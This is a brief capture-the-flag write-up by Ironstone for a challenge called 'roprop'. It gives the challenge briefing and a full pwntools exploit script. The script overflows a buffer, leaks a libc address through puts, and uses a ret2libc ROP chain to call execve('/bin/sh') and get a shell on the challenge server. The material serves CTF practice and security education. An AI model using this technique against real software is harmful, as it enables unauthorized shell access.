## Briefing:   
```
This is from the back Solar Designer times where you require rope to climb and get anything you want.

nc pwn.darkarmy.xyz 5002
```

```Python
from pwn import *

elf = context.binary = ELF('./roprop', checksec=False)
if args.REMOTE:
    libc = ELF('./libc-remote.so')
    p = remote('roprop.darkarmy.xyz', 5002)
else:
    libc = elf.libc
    p = process()


p.recvuntil('s.\n\n')

rop = ROP(elf)
rop.raw('A' * 88)
rop.puts(elf.got['puts'])
rop.raw(elf.sym['main'])

p.sendline(rop.chain())

leak = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak: {hex(leak)}')


p.recvlines(2)

libc.address = leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

# ret2libc
rop = ROP(libc)
rop.raw('A' * 88)
rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)

p.sendline(rop.chain())
p.interactive()
```

(By Ironstone)
